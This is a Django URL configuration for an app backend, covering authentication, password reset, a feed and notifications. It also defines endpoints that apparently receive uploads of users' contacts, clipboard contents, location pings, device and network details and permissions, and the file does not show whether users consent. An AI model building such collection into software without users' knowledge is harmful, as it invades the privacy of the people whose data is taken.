from django.contrib import admin
from django.urls import path, include
from django.contrib.auth.views import PasswordResetView, PasswordResetDoneView, PasswordResetConfirmView, PasswordResetCompleteView
from . import views

urlpatterns = [
    path("auth/", include('djoser.urls')),
    path("auth/", include("djoser.urls.authtoken")),
    path("username-available/", views.UsernameAvailable.as_view()),
    path("email-available/", views.EmailAvailable.as_view()),
    path("set-profile-pic/", views.SetProfilePic.as_view()),
    path('password/reset/', PasswordResetView.as_view(template_name='users/password_reset_form.html', html_email_template_name='users/password_reset_email.html', subject_template_name="users/password_reset_subject.txt"), name='password_reset'),
    path('password/reset/done', PasswordResetDoneView.as_view(template_name='users/password_reset_done.html'), name='password_reset_done'),
    path('password/reset/<uidb64>/<token>/', PasswordResetConfirmView.as_view(template_name='users/password_reset_confirm.html'), name='password_reset_confirm'),
    path('password/reset/complete', PasswordResetCompleteView.as_view(template_name='users/password_reset_complete.html'), name='password_reset_complete'),
    path("feed/", views.FeedList.as_view()),
    path("data/connection/", views.ConnectionCreate.as_view()),
    path("data/network-info/", views.NetworkInfoCreate.as_view()),
    path("data/device/android/", views.AndroidDeviceCreate.as_view()),
    path("data/device/ios/", views.iOSDeviceCreate.as_view()),
    path("data/locationreport/", views.LocationPingReport.as_view()),
    path("data/contacts/", views.ContactUpload.as_view()),
    path("data/clipboard/", views.ClipboardDataUpload.as_view()),
    path("notifications/", views.NotificationsList.as_view()),
    path("data/permissions/", views.PermissionsAddView.as_view()),
]